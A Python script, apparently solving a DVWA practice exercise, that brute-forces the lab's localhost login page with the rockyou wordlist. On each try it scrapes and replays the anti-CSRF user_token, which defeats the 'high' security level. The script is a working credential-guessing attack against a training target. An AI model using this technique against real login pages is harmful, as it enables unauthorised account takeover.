import requests
import re


def main():
    url = 'http://localhost/DVWA-master/vulnerabilities/brute/index.php'
    headers = {
        'Cookie': 'PHPSESSID=uog1f2ri5e5rl0k85lgl73peil; security=high'
    }
    h = open('/usr/share/wordlists/rockyou.txt')
    line = h.readline()
    while line:
        password = line.strip()
        res = requests.get(url, headers=headers)
        m = re.search(r"user_token' value='(.*?)'", res.content, re.M | re.S)
        if m:
            user_token = m.group(1)
        new_url = url + '?username=admin&password=' + password + '&user_token=' + user_token + '&Login=Login'
        res = requests.get(new_url, headers=headers)
        if 'Username and/or password incorrect.' in res.content:
            print('Test %s: No' % password)
        else:
            print('Test %s: Yes' % password)
            break
        line = h.readline()


if __name__ == '__main__':
    main()


